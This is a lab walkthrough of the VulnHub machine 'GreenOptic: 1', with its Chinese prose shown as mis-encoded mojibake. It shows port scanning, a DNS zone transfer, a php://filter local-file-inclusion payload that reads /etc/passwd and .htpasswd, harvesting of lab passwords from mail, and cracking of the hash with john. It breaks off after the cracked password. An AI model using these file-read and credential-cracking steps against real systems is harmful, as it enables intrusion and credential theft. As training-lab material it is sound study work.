# GREENOPTIC: 1
ä¸‹è½½åœ°å€ï¼š
```
https://download.vulnhub.com/greenoptic/GreenOptic.ova
```
## å®æˆ˜æ“ä½œ
å‘ç°é¶æœºIPåœ°å€ï¼š`192.168.32.139`ã€‚
æ‰«æé¶æœºç«¯å£å¼€æ”¾æƒ…å†µã€‚
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sV -p1-65535 192.168.32.139                                                                                                                                                                                                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-27 01:16 EST
Nmap scan report for 192.168.32.139
Host is up (0.00027s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp    open  domain  ISC BIND 9.11.4-P2 (RedHat Enterprise Linux 7)
80/tcp    open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
10000/tcp open  http    MiniServ 1.953 (Webmin httpd)
MAC Address: 00:0C:29:A1:9A:22 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:redhat:enterprise_linux:7
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.75 seconds
```
FTPä½¿ç”¨åŒ¿åç™»å½•å¤±è´¥
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ftp 192.168.32.139
Connected to 192.168.32.139.
220 (vsFTPd 3.0.2)
Name (192.168.32.139:root): anomymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```
æµè§ˆå™¨è®¿é—®80æœåŠ¡
![]()
æŸ¥çœ‹æºä»£ç ï¼Œæ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œä½¿ç”¨dirbusterè¿›è¡Œç›®å½•çˆ†ç ´ï¼Œæ‰¾åˆ°`account`ç›®å½•
![]()
çœ‹åˆ°incluldeï¼Œå°±å¯ä»¥çœ‹çœ‹æœ‰æ²¡æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ã€‚**æŸ¥çœ‹æºä»£ç æ‰å¯ä»¥çœ‹åˆ°æœ‰æ–‡ä»¶ä¿¡æ¯**ã€‚
![]()
æš‚æ—¶æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°å€ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹10000ç«¯å£ã€‚
![]()
éœ€è¦å†™æœ¬åœ°hostsåœ°å€ï¼Œ`greenoptic.vm`å’Œ`websrv01.greenoptic.vm`ã€‚
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# cat /etc/hosts
192.168.32.139 websrv01.greenoptic.vm
192.168.32.139 greenoptic.vm
```
é‡æ–°è®¿é—®è¿™ä¸ªåœ°å€`https://websrv01.greenoptic.vm:10000`ã€‚ä½¿ç”¨å¼±å£ä»¤ç™»å½•å¤±è´¥ã€‚
![]()
ç«¯å£å¼€æ”¾53ç«¯å£ï¼Œæµ‹è¯•ä¸€ä¸‹æœ‰æ²¡æœ‰DNSåŸŸä¼ é€æ¼æ´ã€‚
```
â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# dig axfr @192.168.32.139 greenoptic.vm
; > DiG 9.16.11-Debian > axfr @192.168.32.139 greenoptic.vm
; (1 server found)
;; global options: +cmd
greenoptic.vm.          3600    IN      SOA     websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600
greenoptic.vm.          3600    IN      NS      ns1.greenoptic.vm.
ns1.greenoptic.vm.      3600    IN      A       127.0.0.1
recoveryplan.greenoptic.vm. 3600 IN     A       127.0.0.1
websrv01.greenoptic.vm. 3600    IN      A       127.0.0.1
greenoptic.vm.          3600    IN      SOA     websrv01.greenoptic.vm. root.greenoptic.vm. 1594567384 3600 600 1209600 3600
;; Query time: 3 msec
;; SERVER: 192.168.32.139#53(192.168.32.139)
;; WHEN: Mon Dec 27 02:37:18 EST 2021
;; XFR size: 6 records (messages 1, bytes 235)
```
å›åˆ°æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½¿ç”¨base64æ–¹å¼æŸ¥çœ‹æ–‡ä»¶ï¼Œ`php://filter/convert.base64-encode/resource=/etc/passwd`ã€‚
![]()
å–passwdæ–‡ä»¶é‡Œé¢çš„ç”¨æˆ·ï¼ŒæŸ¥çœ‹ä»–çš„é‚®ä»¶
```
sam:x:1000:1000::/home/sam:/bin/bash
terry:x:1001:1001::/home/terry:/bin/bash
named:x:25:25:Named:/var/named:/sbin/nologin
alex:x:1002:1002::/home/alex:/bin/bash
dovecot:x:97:97:Dovecot IMAP server:/usr/libexec/dovecot:/sbin/nologin
dovenull:x:997:993:Dovecot's unauthorized user:/usr/libexec/dovecot:/sbin/nologin
monitor:x:1003:1003::/home/monitor:/bin/bash
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
```
samç”¨æˆ·é‚®ä»¶å†…å®¹
```
From PI:EMAIL  Sun Jul 12 16:13:45 2020
Return-Path: 
X-Original-To: sam
Delivered-To: PI:EMAIL
Received: from localhost (localhost [IPv6:::1])
	by websrv01.greenoptic.vm (Postfix) with ESMTP id A8D371090085
	for ; Sun, 12 Jul 2020 16:13:18 +0100 (BST)
Message-Id: 
Date: Sun, 12 Jul 2020 16:13:18 +0100 (BST)
From: PI:EMAIL
Hi Sam, per the team message, the password is HelloSunshine123
```
![]()
terryç”¨æˆ·é‚®ä»¶å†…å®¹
```
From PI:EMAIL  Sun Jul 12 15:52:19 2020
Return-Path: 
X-Original-To: terry
Delivered-To: PI:EMAIL
Received: from localhost (localhost [IPv6:::1])
	by websrv01.greenoptic.vm (Postfix) with ESMTP id C54E21090083
	for ; Sun, 12 Jul 2020 15:51:32 +0100 (BST)
Message-Id: 
Date: Sun, 12 Jul 2020 15:51:32 +0100 (BST)
From: PI:EMAIL
Terry
As per your request we have installed phpBB to help with incident response.
Your username is terry, and your password is wsllsa!2
Let us know if you have issues
Server Support - Linux
```
æ ¹æ®è¿™ä¸¤å°é‚®ä»¶è·å–åˆ°ä¸¤ä¸ªç”¨æˆ·å¯†ç 
```
sam/HelloSunshine123
terry/wsllsa!2
```
ä½†æ˜¯è¿™ä¸¤ä¸ªè´¦å·å¯†ç ä¸èƒ½ ç™»å½•åˆ°`account`å’Œ`webim`ç³»ç»Ÿã€‚
è®¿é—®DNSåŸŸä¼ é€å‘ç°åŸŸå`recoveryplan.greenoptic.vm`ï¼ˆéœ€åŠ hostsï¼‰ã€‚å°±ä¼šå¼¹å‡ºçª—å£ï¼Œè¾“å…¥è´¦å·å’Œå¯†ç ï¼Œä½†æ˜¯å‘ç°è¿˜æ˜¯ç™»å½•ä¸äº†ã€‚
![]()
æŸ¥çœ‹`/var/www/.htpasswd`æ–‡ä»¶
```
staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.
```
![]()
ä½¿ç”¨`john`çˆ†ç ´å¯†ç ï¼Œéœ€è¦å…ˆè§£å‹rockyouå­—å…¸ã€‚
`gzip -d /usr/share/wordlists/rockyou.txt.gz`
```
â”Œâ”€â”€(rootğŸ’€kali)-[/usr/share/wordlists]
â””â”€# john --wordlist:/usr/share/wordlists/rockyou.txt /tmp/htpasswd 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
wheeler          (staff)
1g 0:00:00:00 DONE (2021-12-27 03:10) 6.250g/s 82200p/s 82200c/s 82200C/s guess1..justin01